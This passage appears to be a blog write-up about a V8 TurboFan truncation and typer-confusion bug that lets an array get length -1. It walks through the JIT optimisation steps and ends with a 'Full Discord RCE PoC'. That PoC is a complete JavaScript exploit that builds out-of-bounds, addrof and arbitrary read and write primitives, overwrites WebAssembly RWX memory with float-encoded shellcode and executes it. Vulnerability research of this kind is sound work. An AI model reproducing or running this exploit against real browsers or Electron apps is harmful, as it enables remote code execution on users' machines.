     if (output_type.Is(cache_->kPositiveSafeInteger)) {
       op = simplified()->CheckedUint64ToInt32(use_info.feedback()); [2]
     }
```

I’m really curious how these experts find such amazing bugs, these bugs like these are incredibly subtle and complex. Are they using fuzzing techniques, I wonder if this is found via fuzzing or is it just countless hours spent debugging and studying the source code? Respect anyway.

### Type Confusion (How array gets -1)

To demonstrate the issue, let’s modify the foo function and run this.
```js
            function foo(a) {
                let x = -1;
                if (a){
                    x = 0xFFFFFFFF;
                }
                let oob_smi = new Array(0 - Math.max(0, x));
                // TurboFan tracks the only possible length 0, 
                // but the actual length in memory is 1
                if (oob_smi.length != 0) { 
                    // 0(turbofan tracked len) -1 
                    oob_smi.length = -1; 
                }
                return oob_smi;
               
            }
            try{
                var before_opt = foo(true);
            }
            catch(err){
            //RangeError: Invalid array length(-1/-0xffff_fff)
                console.log(err)
            }
            for (var i = 0; i < 0x10000; ++i) {
                foo(false);
            }
            //no error here? how?
            var oob_smi = foo(true)
            console.log(oob_smi.length)//-1 wtf how?
           
```

Notice here that our arr length became -1. In V8, array lengths are treated as unsigned values. A length of -1, when interpreted as an unsigned integer, so it becomes 0xFFFFFFFF. This essentially gives the array a length of 4,294,967,295, allowing access to a huge portion of memory. AS u can see we can access value out of bounds at offset 1337. Now, let’s quickly understand how we got array length to be -1.
In the code, we are just creating an array with a size equal to Math.sign(0 - Math.max(0, x)) and then call pop() on it, which decreases the array size by 1
Quickly Note about Math.sign: it tells you the sign of a number. It returns 1 for positive, -1 for negative, and 0 for zero. 
With that in mind, let’s see how this function can be used to achieve out-of-bounds array access, which means accessing memory beyond the array’s allocated bounds.
Before optimization, if we call foo(false), x is -1. Math.max(0, -1) results in 0, and Math.sign(0 - 0) is also 0. This creates an array of size 0. Calling pop() on an array of size 0 simply returns undefined, leaving the array unchanged.
Now, if we call foo(true), x is 0xFFFFFFFF. In this case, Math.max(0, x) returns 0xFFFFFFFF, and Math.sign(0 - 0xFFFFFFFF) gives -1. This creates an array with a size of -1, which is invalid and causes an error. So far, everything works as expected.
But during the optimization two interesting things will happen, one the truncation bug which we discussed previously and other a typer confusion. If we call foo(true), x becomes 0xFFFFFFFF. We know that due to the truncation bug, Math.max(0, x) incorrectly returns -1. This causes Math.sign(0 - (-1)) to become 1, so the array is created with a size of 1. However, TurboFan assumes that the output of Math.sign will always fall within the range [-1, 0], but in reality we can produce value outside this range using the truncation bug. What do I mean by Range(-1,0)
So TurboFan's Range type represents a specific interval of integers defined by a minimum and maximum value. Unlike generic types like Signed32 or Unsigned32, TurboFan tracks integers in precise ranges to optimize more effectively. For instance, the constant 1 is tracked as Range(1, 1) instead of a broader range like Unsigned32. This range type is further used in optimizations after typer phase. So here in our exploit, TurboFan assumes the math.sign in our code will always fall within the range [-1, 0]. However, due to the truncation bug, we can produce value outside of this confusing the typer.
Now this confusion can give us arbitrary memory read and write, this is how, During the n. when pop() is called, instead of directly invoking the pop function, the operation is inlined. This means the pop call is replaced with a set of instructions that perform the same operation without the overhead of the function call. We can confirm this behavior by analyzing TurboFan’s output in Turbolizer and reviewing V8’s source code.
At this stage, the inlined code reduces the array’s length by 1 and stores the updated length. It also updates the Range value of subtraction it will be (-1,-1)
if (array.length != 0) {
  let length = array.length;
  --length;
  array.length = length;
  array[length] = %TheHole();
}
Later in the optimization process, TurboFan applies constant folding, which further simplifies the code. Instead of dynamically calculating length = length - 1, it directly computes the length using the assumed range values. For example, it evaluates 0 - 1 at compile time and updates the length directly with this result.
Here’s the issue: while the array’s actual length should be 0 after a pop, the typer incorrectly tracks a value of 0 - 1 = -1 due to the truncation bug. This leads to a typer confusion where we can create an array with a length of -1, giving us full access to memory. The final inlined and folded code looks like this:

let array = Array(n);
if (n != 0) {
  array.length = -1;
  array[-1] = %TheHole();
}
By exploiting this confusion, we can craft an array with a negative length, gaining arbitrary memory access.



If you’re wondering how we got an array with a length of -1, we need to dig a little deeper into TurboFan optimization.
    ```function foo(a) {
        let x = -1;
        if (a){
            x = 0xFFFFFFFF;
        }
        let oob_smi = new Array(Math.sign(0 - Math.max(0, x)));
       oob_smi.pop();
        return oob_smi;
    }```

### Typer confusion for oob access

n=Math.sign(0 - Math.max(0, x)) 
and then calling pop() function on it, which means the array length will be reduced by 1
array.length= length-1;
So Before optimization by turbofan,
if we call foo(true), in ignition interpreter the following steps will take place
* So, x is 0xFFFFFFFF. 
* And, Math.max(0, x) returns 0xFFFFFFFF, 
* Next, Math.sign(0 - 0xFFFFFFFF) gives -1 because its argument is negative.
* This creates an array with a size of -1, which is invalid and causes an error because in js we can’t create a negative length array. So far, everything works as expected.
But during the optimization two interesting things will happen, due to the truncation bug which we discussed previously.
 If we call foo(true), 
* x becomes 0xFFFFFFFF. 
* And We know that due to the truncation bug, Math.max(0, x) incorrectly returns -1 instead  of 0xFFFFFFFF. 
* This causes Math.sign(0 - (-1)) to become 1,
* This inturn creates an array with a size of 1. 
* Now calling pop on this array should produce an array with length 0, but it doesn’t we get array with length -1. why?
* TurboFan doesn’t recognize the truncation bug, and because of this, it speculates that the output of Math.sign will always be -1 for a foo(true) call or 0 for a foo(false) call. Based on this, it assumes that the array will only ever be created with a length of 0, as a length of -1 would throw an error. However, TurboFan doesn’t realize that, due to the truncation bug, we can actually create an array with a length of 1.
* When pop() is called, instead of invoking the function directly, TurboFan inlines the operation to optimize it. Why waste resources calling a function when the same operation can be done with just a few instructions? The inlined code reduces the array length by 1 for all values greater than 0 without actually calling pop.
* At this point, the array’s actual length becomes 0, but TurboFan’s typer, which tracks the array length for optimization purposes, updates its tracked value to -1. So far, this mismatch hasn’t caused any issues because the array’s actual length hasn’t been updated to -1 yet.
    * n=Math.sign(0 - (-1))//1
    * let array = Array(n); //Turbofan only expects 0, but we can create length 1
    * if (array.length != 0) {
    *   let length = array.length;
    *   --length;
    *   array.length = length;
    * }
* But now, TurboFan takes it a step further with constant folding optimization, simplifying the code even more. Instead of dynamically calculating length - 1 at runtime, TurboFan precomputes the updated value during compilation and replaces it directly. Why bother performing length - 1 when you can simply set the new length upfront?
    * n=Math.sign(0 - (-1))//1
    * let array = Array(n);; //Turbofan only expects 0, but we can create length 1
    * if (n != 0) {
    *   array.length = -1;
    * }
That means our array now has a length of 0xFFFF_FFFF, giving us access to memory far beyond its actual bounds on the V8 heap.


### Full Discord RCE PoC
Sharing the PoC but to understand how it works checkout the video on Youtube on how the exploit works after Out-of-bound access.
```js
let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() {
    return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
    int_view[0] = this;
    return float_view[0];
}
Number.prototype.f2i = function() {
    float_view[0] = this;
    return int_view[0];
}
function gc() {
		for(let i=0; i<((1024 * 1024)/0x10); i++) {
			  var a = new String();
		}
}

let shellcode = [2.40327734437787e-310, -1.1389104046892079e-244, 3.1731330715403803e+40, 1.9656830452398213e-236, 1.288531947997e-312, 8.3024907661975715e+270, 1.6469439731597732e+93, 9.026845734376378e-308];

function pwn() {
    /* Prepare RWX */
    var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
    let module = new WebAssembly.Module(buffer);
    var instance = new WebAssembly.Instance(module);
    var exec_shellcode = instance.exports.main;

    function f(a) {
        let x = -1;
        if (a) x = 0xFFFFFFFF;
        let oob_smi = new Array(Math.sign(0 - Math.max(0, x, -1)));
        oob_smi.pop();
        let oob_double = [3.14, 3.14];
        let arr_addrof = [{}];
        let aar_double = [2.17, 2.17];
        let www_double = new Float64Array(8);
        return [oob_smi, oob_double, arr_addrof, aar_double, www_double];
    }
    gc();

    for (var i = 0; i < 0x10000; ++i) {
        f(false);
    }
    let [oob_smi, oob_double, arr_addrof, aar_double, www_double] = f(true);
    console.log("[+] oob_smi.length = " + oob_smi.length);
    oob_smi[14] = 0x1234;
    console.log("[+] oob_double.length = " + oob_double.length);

    let primitive = {
        addrof: (obj) => {
            arr_addrof[0] = obj;
            return (oob_double[8].f2i() >> 32n) - 1n;
        },
        half_aar64: (addr) => {
            oob_double[15] = ((oob_double[15].f2i() & 0xffffffff00000000n)
                              | ((addr - 0x8n) | 1n)).i2f();
            return aar_double[0].f2i();
        },
        full_aaw: (addr, values) => {
            oob_double[27] = 0x8888n.i2f();
            oob_double[28] = addr.i2f();
            for (let i = 0; i < values.length; i++) {
                www_double[i] = values[i];
            }
        }
    };

    console.log(primitive.addrof(oob_double).hex());
    let addr_instance = primitive.addrof(instance);
    console.log("[+] instance = " + addr_instance.hex());
    let addr_shellcode = primitive.half_aar64(addr_instance + 0x68n);
    console.log("[+] shellcode = " + addr_shellcode.hex());
    primitive.full_aaw(addr_shellcode, shellcode);
    console.log("[+] GO");
    exec_shellcode();
    return;
}

```
